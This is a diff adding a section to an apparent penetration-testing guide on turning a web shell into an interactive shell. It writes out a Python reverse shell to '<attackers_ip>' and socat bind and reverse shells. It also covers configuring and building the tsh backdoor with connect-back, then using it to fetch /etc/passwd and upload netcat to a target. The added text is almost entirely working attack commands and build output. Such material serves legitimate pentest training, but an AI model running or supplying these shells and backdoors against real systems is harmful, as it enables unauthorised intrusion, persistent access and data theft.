@@ -334,7 +334,114 @@ fi
 
 This section is not directly related to either pivoting or tunneling but instead describes a way of simplifying your work when developing attack into the internal network. Often, using a web-shell is rather tedious, especially when using programs that expect an interactive command interface. Most likely you will use some workarounds to performs simple tasks, such as passing password to sudo/su or just editing a file. I’m not a big fan of torturing myself, so when there’s an oportunity to escalate the web-shell to an interactive shell, I do so :) I won’t cover stuff like launching semi-interactive shell using bash/perl/python etc. There’s a ton of info on doing so. Check out this reverse shell cheat sheet - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet.
 
+## Python PTY shell
+
+An upgrade from a regular semi-interactive shell. You can execute the following command in your existing shell:
+
+```python -c 'import pty; pty.spawn("/bin/bash")'```
+
+Or initiate reverse connection:
+
+```
+python -c 'import socket,subprocess,os;\
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\
+s.connect(("<attackers_ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\
+os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+
+## Socat
+
+Netcat on steroids! Seriously tho, go check this [tool’s](http://www.dest-unreach.org/socat/) manual man socat and you’d be amazed what you can do with this tool regarding tunneling. Among other things it can spawn a fully interactive shell, even better than the aforementioned python-pty. The downside is that you most probably will have to build/install this tool on the target server as it is not a default utility in most unix-like distributions.
+
+### Bind shell
+Set listener:
+
+```socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane```
+
+Connect to the listener:
+
+```socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337```
+
+### Reverse shell
+Set listener:
+
+```socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0```
+
+Connect to attacker’s machine:
+
+```socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane```
+
+### Terminal size
+
+By default the terminal size is quite small, as you may notice when launching ```top``` command or editing files with a text editor. You can easily change this, use ```stty -a``` command to get the size of your regular teminal:
+
+```
+$ stty -a
+speed 38400 baud; rows 57; columns 211; line = 0;
+```
+Apply desired size to your socat terminal:
+
+```$ stty rows 57 cols 211```
 
 
+## Tsh
 
+[Tsh](https://github.com/creaktive/tsh) is a small ssh-like backdoor with full-pty terminal and with capability of file transfer. This tool has very small footprint and is easily built on most unix-like systems. Start with editing tsh.h file:
 
+```c
+#ifndef _TSH_H
+#define _TSH_H
+
+char *secret = "never say never say die";
+
+#define SERVER_PORT 22
+short int server_port = SERVER_PORT;
+/*
+#define CONNECT_BACK_HOST  "localhost"
+#define CONNECT_BACK_DELAY 30
+*/
+#define GET_FILE 1
+#define PUT_FILE 2
+#define RUNSHELL 3
+
+#endif /* tsh.h */
+```
+
+Change ```secret```, specify ```SERVER_PORT```. Uncomment and edit ```CONNECT_BACK_HOST``` and ```CONNECT_BACK_DELAY``` directives if you want backconnect. Run make:
+
+```bash
+$ make linux_x64
+make								\
+	LDFLAGS=" -Xlinker --no-as-needed -lutil"	\
+	DEFS=" -DLINUX"					\
+	tsh tshd
+make[1]: Entering directory '/tmp/tsh'
+gcc -O3 -W -Wall -DLINUX -c pel.c
+gcc -O3 -W -Wall -DLINUX -c aes.c
+gcc -O3 -W -Wall -DLINUX -c sha1.c
+gcc -O3 -W -Wall -DLINUX -c tsh.c
+gcc -Xlinker --no-as-needed -lutil -o tsh pel.o aes.o sha1.o tsh.o
+strip tsh
+gcc -O3 -W -Wall -DLINUX -c tshd.c
+gcc -Xlinker --no-as-needed -lutil -o tshd pel.o aes.o sha1.o tshd.o
+strip tshd
+make[1]: Leaving directory '/tmp/tsh'
+```
+
+Now run ```./tshd``` on server. It will start listening on the specified port. You can connect to it via executing the following command:
+
+```./tsh host_ip```
+
+If ```tsh``` was compiled with backconnect capability, the ```tshd``` daemon will try to connect back to the attacker’s machine. To launch listener on attacker’s side:
+
+```
+$ ./tsh cb
+Waiting for the server to connect...
+```
+
+To transfer files with tsh:
+
+```
+./tsh host_ip get /etc/passwd .
+./tsh host_ip put /bin/netcat /tmp
+```
